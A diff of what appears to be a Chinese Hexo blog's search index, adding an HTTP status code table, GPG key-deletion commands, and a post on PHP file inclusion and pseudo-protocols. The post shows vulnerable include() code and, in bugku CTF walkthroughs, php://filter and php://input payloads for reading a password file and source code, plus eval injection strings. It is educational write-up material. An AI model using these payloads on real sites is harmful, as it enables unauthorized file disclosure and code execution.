@@ -278,6 +278,306 @@
 <h3 id="521-Web-Server-Is-Down"><a href="#521-Web-Server-Is-Down" class="headerlink" title="521 Web Server Is Down"></a>521 Web Server Is Down</h3><p>指目标服务器挂了，一般在一些CDN上会出现（例如Cloudflare）</p>
 <hr>
 <h1 id="http状态码的逻辑关系图"><a href="#http状态码的逻辑关系图" class="headerlink" title="http状态码的逻辑关系图"></a>http状态码的逻辑关系图</h1><p><img src="https://config.net.cn/images/tools/httpstatus/httpstatuscode.png" alt="http状态码的逻辑关系图"></p>
+<h2 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h2><p>HTTP状态码(响应码)用来表明HTTP请求是否已经成功完成.HTTP响应类型一共分五大类:消息响应,成功响应,重定向,客户端错误,服务器端错误.</p>
+<p>下表列出了所有HTTP状态码,以及他们各自所代表的含义:</p>
+<table>
+<thead>
+<tr>
+<th align="center">状态码</th>
+<th align="left">原因短语</th>
+<th align="left">代表含义</th>
+<th align="left">HTTP 版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">消息响应</td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="center">100</td>
+<td align="left">Continue (继续)</td>
+<td align="left">客户端应当继续发送请求.这个临时响应是用来通知客户端它的部分请求已经被服务器接收,且仍未被拒绝.客户端应当继续发送请求的剩余部分,或者如果请求已经完成,忽略这个响应.服务器必须在请求完成后向客户端发送一个最终响应.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">101</td>
+<td align="left">Switching Protocol (切换协议)</td>
+<td align="left">服务器已经理解了客户端的请求，并将通过Upgrade消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到 在Upgrade消息头中定义的那些协议。: 只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的HTTP版本比旧版本更有优势，或者切换到一个实时且同步的协议以传送利用此类特 性的资源。</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">成功响应</td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="center">200</td>
+<td align="left">OK (成功)</td>
+<td align="left">请求成功.成功的意义根据请求所使用的方法不同而不同.GET: 资源已被提取,并作为响应体传回客户端.HEAD: 实体头已作为响应头传回客户端POST: 经过服务器处理客户端传来的数据,适合的资源作为响应体传回客户端.TRACE: 服务器收到请求消息作为响应体传回客户端.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">201</td>
+<td align="left">Created (已创建)</td>
+<td align="left">请求成功，而且有一个新的资源已经依据请求的需要而建立，通常这是 PUT 方法得到的响应码.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">202</td>
+<td align="left">Accepted (已创建)</td>
+<td align="left">服务器已接受请求，但尚未处理。正如它可能被拒绝一样，最终该请求可能会也可能不会被执行。在异步操作的场合下，没有比发送这个状态码更方便的做法了。:返回202状态码的响应的目的是允许服务器接受其他过程的请求（例如某个每天只执行一次的基于批处理的操作），而不必让客户端一直保持与服务器的连接直到批处理操作全部完成。在接受请求处理并返回202状态码的响应应当在返回的实体中包含一些指示处理当前状态的信息，以及指向处理状态监视器或状态预测的指针，以便用户能够估计操作是否已经完成。</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">203</td>
+<td align="left">Non-Authoritative Information (未授权信息)</td>
+<td align="left">服务器已成功处理了请求,但返回的实体头部元信息不是在原始服务器上有效的确定集合，而是来自本地或者第三方的拷贝,如果不是上述情况,使用200状态码才是最合适的.</td>
+<td align="left">HTTP&#x2F;0.9 and 1.1</td>
+</tr>
+<tr>
+<td align="center">204</td>
+<td align="left">No Content (无内容)</td>
+<td align="left">该响应没有响应内容,只有响应头,响应头也可能是有用的.用户代理可以根据新的响应头来更新对应资源的缓存信息.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">205</td>
+<td align="left">Reset Content (重置内容)</td>
+<td align="left">告诉用户代理去重置发送该请求的窗口的文档视图.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">206</td>
+<td align="left">Partial Content (部分内容)</td>
+<td align="left">当客户端通过使用range头字段进行文件分段下载时使用该状态码</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">重定向</td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="center">300</td>
+<td align="left">Multiple Choice (多种选择)</td>
+<td align="left">该请求有多种可能的响应,用户代理或者用户必须选择它们其中的一个.服务器没有任何标准可以遵循去代替用户来进行选择.</td>
+<td align="left">HTTP&#x2F;1.0 and later</td>
+</tr>
+<tr>
+<td align="center">301</td>
+<td align="left">Moved Permanently (永久移动)</td>
+<td align="left">该状态码表示所请求的URI资源路径已经改变,新的URL会在响应的<code>Location</code>:头字段里找到.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">302</td>
+<td align="left">Found (临时移动)</td>
+<td align="left">该状态码表示所请求的URI资源路径临时改变,并且还可能继续改变.因此客户端在以后访问时还得继续使用该URI.新的URL会在响应的<code>Location:</code>头字段里找到.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">303</td>
+<td align="left">See Other (查看其他位置)</td>
+<td align="left">服务器发送该响应用来引导客户端使用GET方法访问另外一个URI.</td>
+<td align="left">HTTP&#x2F;0.9 and 1.1</td>
+</tr>
+<tr>
+<td align="center">304</td>
+<td align="left">Not Modified (未修改)</td>
+<td align="left">告诉客户端,所请求的内容距离上次访问并没有变化. 客户端可以直接从浏览器缓存里获取该资源.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">305</td>
+<td align="left">Use Proxy (使用代理)</td>
+<td align="left">所请求的资源必须统过代理才能访问到.由于安全原因,该状态码并未受到广泛支持.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">306</td>
+<td align="left"><em>unused</em> (未使用)</td>
+<td align="left">这个状态码已经不再被使用,当初它被用在HTTP 1.1规范的旧版本中.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">307</td>
+<td align="left">Temporary Redirect (临时重定向)</td>
+<td align="left">服务器发送该响应用来引导客户端使用相同的方法访问另外一个URI来获取想要获取的资源.新的URL会在响应的<code>Location:</code>头字段里找到.与302状态码有相同的语义,且前后两次访问必须使用相同的方法(GET POST).</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">308</td>
+<td align="left">Permanent Redirect (永久重定向)</td>
+<td align="left">所请求的资源将永久的位于另外一个URI上.新的URL会在响应的<code>Location:</code>头字段里找到.与301状态码有相同的语义,且前后两次访问必须使用相同的方法(GET POST).</td>
+<td align="left">HTTPbis (试验草案)</td>
+</tr>
+<tr>
+<td align="center">客户端错误</td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="center">400</td>
+<td align="left">Bad Request (错误请求)</td>
+<td align="left">因发送的请求语法错误,服务器无法正常读取.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">401</td>
+<td align="left">Unauthorized (未授权)</td>
+<td align="left">需要身份验证后才能获取所请求的内容,类似于403错误.不同点是.401错误后,只要正确输入帐号密码,验证即可通过.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">402</td>
+<td align="left">Payment Required (需要付款)</td>
+<td align="left">该状态码被保留以供将来使用.创建此代码最初的目的是为数字支付系统而用,然而,到现在也没投入使用.</td>
+<td align="left">HTTP&#x2F;0.9 and 1.1</td>
+</tr>
+<tr>
+<td align="center">403</td>
+<td align="left">Forbidden (禁止访问)</td>
+<td align="left">客户端没有权利访问所请求内容,服务器拒绝本次请求.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">404</td>
+<td align="left">Not Found (未找到)</td>
+<td align="left">服务器找不到所请求的资源.由于经常发生此种情况,所以该状态码在上网时是非常常见的.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">405</td>
+<td align="left">Method Not Allowed (不允许使用该方法)</td>
+<td align="left">该请求使用的方法被服务器端禁止使用,RFC2616中规定, <code>GET</code> 和 <code>HEAD</code> 方法不能被禁止.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">406</td>
+<td align="left">Not Acceptable (无法接受)</td>
+<td align="left">在进行服务器驱动内容协商后,没有发现合适的内容传回给客户端.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">407</td>
+<td align="left">Proxy Authentication Required (要求代理身份验证)</td>
+<td align="left">类似于状态码 401,不过需要通过代理才能进行验证.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">408</td>
+<td align="left">Request Timeout (请求超时)</td>
+<td align="left">客户端没有在服务器预备等待的时间内完成一个请求的发送.这意味着服务器将会切断和客户端的连接. 在其他浏览器中,这种响应更常见一些, 例如Chrome 和 IE9, 目的是为了使用HTTP 预连机制加快浏览速度. 同时注意,一些服务器不发送此种响应就直接切断连接.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">409</td>
+<td align="left">Conflict (冲突)</td>
+<td align="left">该请求与服务器的当前状态所冲突.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">410</td>
+<td align="left">Gone (已失效)</td>
+<td align="left">所请求的资源已经被删除.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">411</td>
+<td align="left">Length Required (需要内容长度头)</td>
+<td align="left">因服务器在本次请求中需要 <code>Content-Length</code> 头字段,而客户端没有发送.所以,服务器拒绝了该请求.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">412</td>
+<td align="left">Precondition Failed (预处理失败)</td>
+<td align="left">服务器没能满足客户端在获取资源时在请求头字段中设置的先决条件.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">413</td>
+<td align="left">Request Entity Too Large (请求实体过长)</td>
+<td align="left">请求实体大小超过服务器的设置的最大限制,服务器可能会关闭HTTP链接并返回<code>Retry-After</code> 头字段.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">414</td>
+<td align="left">Request-URI Too Long (请求网址过长)</td>
+<td align="left">客户端请求所包含的URI地址太长,以至于服务器无法处理.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">415</td>
+<td align="left">Unsupported Media Type (媒体类型不支持)</td>
+<td align="left">服务器不支持客户端所请求的媒体类型,因此拒绝该请求.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">416</td>
+<td align="left">Requested Range Not Satisfiable (请求范围不合要求)</td>
+<td align="left">请求中包含的<code>Range</code>头字段无法被满足,通常是因为<code>Range</code>中的数字范围超出所请求资源的大小.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">417</td>
+<td align="left">Expectation Failed (预期结果失败)</td>
+<td align="left">在请求头<code> Expect</code> 中指定的预期内容无法被服务器满足.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">418</td>
+<td align="left">I’m a teapot (服务端拒绝用茶壶煮咖啡)</td>
+<td align="left">超文本咖啡壶控制协议（英语：Hyper Text Coffee Pot Control Protocol，缩写HTCPCP）是由IETF虚构的一种协议。这个协议在文档RFC 2324（1998年4月1日发布）中定义，是一个恶搞RFC。 该协议被设计为一个类似HTTP的协议，可以用于控制、监测和诊断咖啡壶，后来也被拓展到茶壶；该协议有时也可以视作一种早期的物联网实验。</td>
+<td align="left">HTCPCP 可用</td>
+</tr>
+<tr>
+<td align="center">服务器端错误</td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="center">500</td>
+<td align="left">Internal Server Error (内部服务器错误)</td>
+<td align="left">服务器遇到未知的无法解决的问题.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">501</td>
+<td align="left">Not Implemented (未实现)</td>
+<td align="left">服务器不支持该请求中使用的方法,比如<code>POST</code> 和 <code>PUT.只有``GET</code> 和 <code>HEAD</code> 是RFC2616规范中规定服务器必须实现的方法.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">502</td>
+<td align="left">Bad Gateway (网关错误)</td>
+<td align="left">服务器作为网关且从上游服务器获取到了一个无效的HTTP响应.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">503</td>
+<td align="left">Service Unavailable (服务不可用)</td>
+<td align="left">由于临时的服务器维护或者过载,服务器当前无法处理请求.这个状况是临时的,并且将在一段时间以后恢复.如果能够预计延迟时间,那么响应中可以包含一个<code>Retry-After:</code>头用以标明这个延迟时间.如果没有给出这个<code>Retry-After:</code>信息，那么客户端应当以处理500响应的方式处理它.同时,这种情况下,一个友好的用于解释服务器出现问题的页面应当被返回,并且,缓存相关的HTTP头信息也应该包含,因为通常这种错误提示网页不应当被客户端缓存.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">504</td>
+<td align="left">Gateway Timeout (网关超时)</td>
+<td align="left">服务器作为网关且不能从上游服务器及时的得到响应返回给客户端.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">505</td>
+<td align="left">HTTP Version Not Supported (HTTP版本不受支持)</td>
+<td align="left">服务器不支持客户端发送的HTTP请求中所使用的HTTP协议版本.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+</tbody></table>
 ]]></content>
       <categories>
         <category>杂项</category>
@@ -347,13 +647,19 @@
 <p>如果你有多个密钥，可以用下面指令加密，<code>-u</code>参数指定发送者</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gpg -e -u &quot;Your Name&quot; -r &quot;Receiver Name&quot; &lt;filename&gt;<br></code></pre></td></tr></table></figure>
 
-
-
 <h2 id="GPG解密文件"><a href="#GPG解密文件" class="headerlink" title="GPG解密文件"></a>GPG解密文件</h2><p>收到对方用我们自己的公钥加密的.gpg文件后，使用下面命令解密</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gpg -d &lt;filename&gt;<br></code></pre></td></tr></table></figure>
 
 <p>例如我要解密用我的公钥加密的.gpg文件 1.txt.gpg 直接终端输入<code>gpg -d 1.txt.gpg </code></p>
 <img src="https://images.gaifagafin.top/202311101728700.png" style="zoom: 67%;" />
+
+<h2 id="删除密钥"><a href="#删除密钥" class="headerlink" title="删除密钥"></a>删除密钥</h2><p>删除密钥有三个选项：</p>
+<p>–delete-keys、–delete-secret-keys和–delete-secret-and-public-key<br>–delete-keys表示从公钥钥匙圈上删除密钥，也就是一同删除公钥和对应的私钥。在分批模式（batch mode）下，密钥必须使用指纹表示，或者使用–yes选项。<br>–delete-secret-keys表示从私钥钥匙圈上删除密钥。<br>–delete-secret-and-public-key和–delete-keys一样，但是如果私钥存在的话，会先移除私钥。在分批模式下，密钥必须使用指纹表示。</p>
+<p>例如我要删除我的公钥中的<code>testname</code>公钥，就输入下面的语句</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gpg --delete-keys testname<br></code></pre></td></tr></table></figure>
+
+<p>要删除<code>testname</code>私钥，就输入下面语句</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gpg --delete-secret-keys testname<br></code></pre></td></tr></table></figure>
 
 <hr>
 <p>参考链接:</p>
@@ -366,6 +672,132 @@
       <tags>
         <tag>GPG</tag>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP伪协议</title>
+    <url>/2023/10/31/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>为了更好地使用代码的重用性，可以使用文件包含函数将文件包含进来，直接使用文件中的代码来提高重用性。但是这也产生了<strong>文件包含漏洞</strong>，产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验被绕过，就会导致文件包含漏洞。</p>
+<h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>include()</td>
+<td>代码执行到 include() 函数时将文件包含</td>
+</tr>
+<tr>
+<td>include_once()</td>
+<td>当重复调用同一文件时只调用一次,功能与 include() 相同</td>
+</tr>
+<tr>
+<td>require()</td>
+<td>require() 执行如果发生错误，函数会报错并终止脚本</td>
+</tr>
+<tr>
+<td>require_once()</td>
+<td>当重复调用同一文件时只调用一次,功能与 require() 相同</td>
+</tr>
+</tbody></table>
+<h2 id="包含漏洞分类"><a href="#包含漏洞分类" class="headerlink" title="包含漏洞分类"></a>包含漏洞分类</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>当包含的文件在服务器本地时，就形成了本地文件包含。文件包含可以包含任意文件，被包含的文件可以不是 PHP 代码，可以是文本或图片等。只要文件被包含就会被服务器脚本语言执行，如果包含的文件内容不符合 php 语法，会直接将文件内容输出。例如下面这段简易的代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>当包含的文件在远程服务器上时，就形成了远程文件包含。所包含远程服务器的文件后缀不能与目标服务器语言相同，远程文件包含需要在 php.ini 中设置：</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini">Copy <span class="hljs-attr">Highlighter-hljsallow_url_include</span> = <span class="hljs-literal">on</span>（是否允许 include/require 远程文件）<br><span class="hljs-attr">allow_url_fopen</span> = <span class="hljs-literal">on</span>（是否允许打开远程文件）<br></code></pre></td></tr></table></figure>
+
+<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><h2 id="PHP-伪协议"><a href="#PHP-伪协议" class="headerlink" title="PHP 伪协议"></a>PHP 伪协议</h2><p><strong>PHP 伪协议</strong>是 PHP 支持的协议与封装协议，几个 PHP 支持的伪协议如下。</p>
+<table>
+<thead>
+<tr>
+<th>伪协议</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file:&#x2F;&#x2F;</td>
+<td>访问本地文件系统</td>
+</tr>
+<tr>
+<td>http:&#x2F;&#x2F;</td>
+<td>访问 HTTP(s) 网址</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;</td>
+<td>访问各个输入&#x2F;输出流</td>
+</tr>
+<tr>
+<td>phar:&#x2F;&#x2F;</td>
+<td>PHP 归档</td>
+</tr>
+<tr>
+<td>zip:&#x2F;&#x2F;</td>
+<td>压缩流</td>
+</tr>
+</tbody></table>
+<p>例如在 allow_url_include &#x3D; on 时服务器上有个文件叫 index.php，且存在文件包含漏洞，这个时候就能用 php 伪协议直接把文件显示出来。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">?file=php://filter/read=convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure>
+
+<p>稍微解释下这个做法，<strong>php:&#x2F;&#x2F;filter&#x2F;</strong> 是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F; 表示读取的方式是 base64 编码后，resource&#x3D;index.php 表示目标文件为index.php。问什么要进行 base64 编码呢？如果不进行 base64 编码传入，index.php 就会直接执行，我们就看不到文件中的内容了。<br>php 协议还常用 <strong>php:&#x2F;&#x2F;input</strong>，这可以访问请求的原始数据的只读流，可以读取 POST 请求的参数。</p>
+<h2 id="使用样例"><a href="#使用样例" class="headerlink" title="使用样例"></a>使用样例</h2><p>假设一个测试页面该页面存在文件包含漏洞，且网站内部有密码的备份文件，尝试获取密码。在 index.php 页面下有个 file 参数用于接收要包含的文件，设置之为 php:&#x2F;&#x2F;input 伪协议，用 post 传递要执行的 php 代码。系统执行 ls 命令遍历目录，看到当前目录下有 2 个 php 文件。<br><img src="https://images.gaifagafin.top/202311051147768.png"><br>显然密码文件不在这里，执行 pwd 命令查看当前的目录，看到这里距离站点根目录还有好几层。<br><img src="https://images.gaifagafin.top/202311051147341.png"><br>使用“ls ..”遍历上一级目录，看到一张图片和 2 个网站的目录。<br><img src="https://images.gaifagafin.top/202311051147439.png"><br>使用“ls ..&#x2F;..”遍历上一级的上一级目录，看到文件“mima”，此地无银三百两。<br><img src="https://images.gaifagafin.top/202311051147878.png"><br>使用 php:&#x2F;&#x2F;filter 伪协议查看该文件，base64 解码后得到想要的东西。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">?file=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=../../mima</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://images.gaifagafin.top/202311051148657.png"><br><img src="https://images.gaifagafin.top/202311051148548.png"></p>
+<h2 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data 伪协议"></a>data 伪协议</h2><p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">data:<span class="hljs-comment">//text/plain;base64,xxxx(base64编码后的数据)</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="例题：bugku-本地包含"><a href="#例题：bugku-本地包含" class="headerlink" title="例题：bugku-本地包含"></a>例题：bugku-本地包含</h1><p>题目的源码如下，观察到代码将提取一个 REQUEST 变量，这个变量时 HTTP Request 变量，默认情况下包含了 GET、POST 和 COOKIE 的数组。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump(<span class="hljs-subst">$a</span>);&quot;</span>);      <span class="hljs-comment">//var_dump() 函数可以输出变量的类型和值</span><br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>第一种解法是利用 eval() 函数，它把字符串按照 PHP 代码来计算，该字符串必须是合法的 PHP 代码且必须以分号结尾。这里 eval() 会把变量 a 中的内容提取出来，然后执行 var_dump() 函数输出。不过由于变量 a 来自于变量 hello 变量，而如果 hello 变量中的内容是代码，也会被执行。所以这里可以传入一句代码来直接显示 flag.php，例如：</p>
+<figure class="highlight abnf"><table><tr><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">hello</span><span class="hljs-operator">=</span>)<span class="hljs-comment">;show_source(%27flag.php%27</span><br></code></pre></td></tr></table></figure>
+
+<p>则在 eval 中，就会把上述 hello 的值替换掉变量 a，等同于执行如下代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>();<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>同理，使用其他的函数显示文件也是可以的，注意使用 “);” 来构造。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">hello=);<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-string">&quot;flag.php&quot;</span>)<br>hello=);<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-string">&quot;flag.php&quot;</span>)<br>hello=);<span class="hljs-keyword">include</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]<br></code></pre></td></tr></table></figure>
+
+<p>第二种解法就是用 PHP 伪协议把 flag.php 文件读出来，然后再使用 include() 函数包含出来。<br><img src="https://images.gaifagafin.top/202311051151314.png"><br>当然还有第 3 种解法，就是直接把 flag.php 导入到 hello 变量中。</p>
+<h1 id="例题：bugku-flag-在-index-里"><a href="#例题：bugku-flag-在-index-里" class="headerlink" title="例题：bugku-flag 在 index 里"></a>例题：bugku-flag 在 index 里</h1><p>打开网页，点击后观察 url 有个文件包含漏洞，也就是说我们可以想办法把包含 flag 的文件导出来。<br><img src="https://images.gaifagafin.top/202311051149193.png"><br>根据提示 flag 在 index.php 里，使用 php 伪协议把文件内容的 base64 编码导出，解码得到 flag。<br><img src="https://images.gaifagafin.top/202311051149193.png"></p>
+<h1 id="例题：bugku-welcome-to-bugkuctf"><a href="#例题：bugku-welcome-to-bugkuctf" class="headerlink" title="例题：bugku-welcome to bugkuctf"></a>例题：bugku-welcome to bugkuctf</h1><p>打开网页查看源码如下，源码要求用 GET 方式传递三个参数，其中 user 不为空，并且作为文件名变量打开后的文件内容为 “welcome to the bugkuctf”，file 要求值为 hint.php。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!--  <br><span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;txt&quot;</span>];  <br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];  <br><span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];  <br>  <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$user</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$user</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello admin!&lt;br&gt;&quot;</span>;  <br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <span class="hljs-comment">//hint.php  </span><br>&#125;<br><span class="hljs-keyword">else</span>&#123;  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are not admin ! &quot;</span>;  <br>&#125;  <br> --&gt;  <br></code></pre></td></tr></table></figure>
+
+<p>对于变量 user，当传进去的变量的参数作为文件名变量去打开时，可用 php:&#x2F;&#x2F;input 作为参数，同时使用 post 方式传入内容作为变量的文件内容。对于 file 变量，可以使用伪协议 php:&#x2F;&#x2F;filter 来读取 hint.php 文件。构造出的 payload 为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">index.php?txt=php:<span class="hljs-comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php&amp;password=</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://images.gaifagafin.top/202311051149941.png"><br>此时就得到了 hint.php 的源码的 base64 编码，解码后得到：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<span class="hljs-comment">//flag.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;good&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>接下来的内容关于 PHP 反序列化，可以前往博客<a href="https://www.cnblogs.com/linfangnan/p/13520608.html">CTF-WEB：PHP 反序列化</a>查看剩余步骤。</p>
